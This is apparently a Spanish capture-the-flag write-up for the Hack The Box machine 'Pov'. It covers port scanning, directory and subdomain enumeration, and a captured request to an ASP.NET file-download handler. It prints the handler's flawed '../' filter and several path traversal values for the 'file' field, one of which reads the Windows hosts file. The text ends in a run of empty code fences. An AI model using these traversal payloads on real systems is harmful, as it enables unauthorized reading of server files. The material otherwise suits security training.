## <code style="color : Aquamarine">POV</code>

<style>
    .codenobutton button {
        display: none;
}
</style>

```shell
cd /htb/machines/pov/nmap
ping 10.129.108.177

```
#Linux (TTL -> 64) | Windows (TTL->128)

```shell
ping -c 1 10.129.108.177 -R   
```

Ejecutamos nmap para scanear todos los puertos y guardarlo en un archivo allPorts

```javascript
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn  10.129.108.177 -oG allPorts
```

Obtenemos:

```codenobutton
┌─[user@parrot]─[~/htb/machines/pov/nmap]
└──╼ $cat allPorts 
# Nmap 7.94SVN scan initiated Thu Jun 20 17:49:58 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.129.108.177
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.108.177 ()	Status: Up
Host: 10.129.108.177 ()	Ports: 80/open/tcp//http///	Ignored State: filtered (65534)
# Nmap done at Thu Jun 20 17:50:25 2024 -- 1 IP address (1 host up) scanned in 26.50 seconds
```
Analizamos mas el puerto 80
```javascript
sudo nmap -sCV -p80 10.129.108.177 -oN targeted
```
Resultados
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 21:25 UTC
Nmap scan report for 10.129.108.177
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds
```
Lanzamos whatweb para determinar las tecnologias que se usan
```javascript
whatweb http://10.129.108.177
```
Obtenemos:
> [!NOTE]
> http://10.129.108.177 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sfitz@pov.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.108.177], Microsoft-IIS[10.0], Script, Title[pov.htb], X-Powered-By[ASP.NET]

```bash
ping -c 1 pov.htb
echo "10.129.108.177   pov.htb" >> /etc/hosts

```
Nos vamos a la url: http://pov.htb y no observamos algo extranio, y analizaremos sub directorio, si no tenemos el diccionario se declist lo instalamos.
```bash
sudo apt install seclists
gobuster dir -u http://pov.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --no-error
```
Obtenemos:

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 142] [--> http://pov.htb/img/]
/css                  (Status: 301) [Size: 142] [--> http://pov.htb/css/]
/js                   (Status: 301) [Size: 141] [--> http://pov.htb/js/]
/IMG                  (Status: 301) [Size: 142] [--> http://pov.htb/IMG/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 142] [--> http://pov.htb/CSS/]
/Img                  (Status: 301) [Size: 142] [--> http://pov.htb/Img/]
/JS                   (Status: 301) [Size: 141] [--> http://pov.htb/JS/]
/*docroot*            (Status: 400) [Size: 3420]

```bash
wfuzz -c --hh=12330 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.pov.htb" http://pov.htb

```
```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   302        1 L      10 W       152 Ch      "dev"                                                               
000009532:   400        6 L      26 W       334 Ch      "#www"                                                              
000010581:   400        6 L      26 W       334 Ch      "#mail"                                                             
000047706:   400        6 L      26 W       334 Ch      "#smtp" 
```
Agregamos el subdominio dev al /etc/hosts y lanzamos curl
```bash
echo "10.129.108.177   dev.pov.htb" >> /etc/hosts
curl -s -X GET http://dev.pov.htb
```

Obtenemos

```html
<head><title>Document Moved</title></head>
<body><h1>Object Moved</h1>This document may be found <a HREF="http://dev.pov.htb/portfolio/">here</a></body>
```

Nos redirige al portafolio y abrimos para investigar el sitio, usamos whatweb para saber

```bash
whatweb http://dev.pov.htb
```

Obtenemos

```h
http://dev.pov.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.108.177], Microsoft-IIS[10.0], RedirectLocation[http://dev.pov.htb/portfolio/], Title[Document Moved], X-Powered-By[ASP.NET]
http://dev.pov.htb/portfolio/ [200 OK] ASP_NET[4.0.30319], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.108.177], JQuery[3.4.1], Meta-Author[Devcrud], Microsoft-IIS[10.0], Script, Title[dev.pov.htb], X-Powered-By[ASP.NET]
```
https://infosecmachines.io
navegamos a  http://dev.pov.htb/portfolio

```


```bash
echo "10.129.185.102   dev.pov.htb" >> /etc/hosts
gobuster dir -u http://dev.pov.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x aspx
gobuster dir -u http://dev.pov.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x aspx --exclude-length 188
```

Y obtenemos 302, es decir todo redirecciona. mas info en https://http.cat/

```bash
gobuster dir -u http://dev.pov.htb/portfolio -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x | grep -v "302"
```
y obtenemos algunos directorios al cual navegamos por contact.aspx y default.aspx

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact.aspx         (Status: 200) [Size: 4691]
/default.aspx         (Status: 200) [Size: 21371]
/Default.aspx         (Status: 200) [Size: 21371]
/assets               (Status: 301) [Size: 159] [--> http://dev.pov.htb/portfolio/assets/]
/Contact.aspx         (Status: 200) [Size: 4691]
/Assets               (Status: 301) [Size: 159] [--> http://dev.pov.htb/portfolio/Assets/]
```
Descargamos el cv y analizamos los metadatos, tenemos en cuenta el nombre del usuario por si sea necesario.
```bash
┌─[root@htb-adqnh87wfy]─[/home/outlanderlat/Downloads]
└──╼ #exiftool cv.pdf 
ExifTool Version Number         : 12.57
File Name                       : cv.pdf
Directory                       : .
File Size                       : 148 kB
File Modification Date/Time     : 2024:06:26 17:07:00-05:00
File Access Date/Time           : 2024:06:26 17:07:00-05:00
File Inode Change Date/Time     : 2024:06:26 17:07:00-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Language                        : es
Tagged PDF                      : Yes
XMP Toolkit                     : 3.1-701
Producer                        : Microsoft® Word para Microsoft 365
Creator                         : Turbo
Creator Tool                    : Microsoft® Word para Microsoft 365
Create Date                     : 2023:09:15 12:47:15-06:00
Modify Date                     : 2023:09:15 12:47:15-06:00
Document ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
Instance ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
Author                          : Turbo

```
Vamos a analizar con burbsuite los parametros que se envian. Al ser un IS los datos que estan en base64 y forma serializada no se pueden alterar, y lo mas interesante es el campo file=cv.pf podemos intentar poner la ruta de otro archivo, 

```bash
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dev.pov.htb/portfolio/
Content-Type: application/x-www-form-urlencoded
Content-Length: 357
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=trcOk8TIs76tiflYimAQ1oYz2NoLl4kVSUYEj%2BOntg5k8qx4Nm2e0e%2Fmp%2FPGZBgSb3iMHpgWJwxC3ZLwcmZ%2BpPiU5Qw%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=vbnHgOARiUCUU42ZGjbprRqOq6O5ObtrthU79l7HTPQLB4RVOAurebcJApvQU6wdqHeOW0XV4AUhDTADmcCgYU6rx2jLWHzJqpl4NWNAbZ2LP%2Bb8JBdRVeAP9sGHD2acXLUKgQ%3D%3D&file=cv.pdf
```
Enviamos el repeater y intentamos acceder al archivo default.aspx y en el codigo observamos un archivo index.aspx.cs ingresamos a este y analizamos el codigo
```css
using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Text.RegularExpressions;
using System.Text;
using System.IO;
using System.Net;

public partial class index : System.Web.UI.Page {
    protected void Page_Load(object sender, EventArgs e) {

    }
    
    protected void Download(object sender, EventArgs e) {
            
        var filePath = file.Value;
        filePath = Regex.Replace(filePath, "../", "");
        Response.ContentType = "application/octet-stream";
        Response.AppendHeader("Content-Disposition","attachment; filename=" + filePath);
        Response.TransmitFile(filePath);
        Response.End();
        
    }
}
```
en la variable filePath encontramos una medidad de seguridad para evitar ir varias rutas hacia atras (directory path transversal) con el formato ../ pero tenemos varias formas de variar esto por ejemplo:

```bash
file=..\..\..\..\..\windows\System32\Drives\etc\hosts
file=../../../../../windows/System32/Drives/etc/hosts
file=c:\Windows\System32\Drivers\etc\hosts
```
El ultimo si funciona, con la ruta directa.
```bash```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
```bash
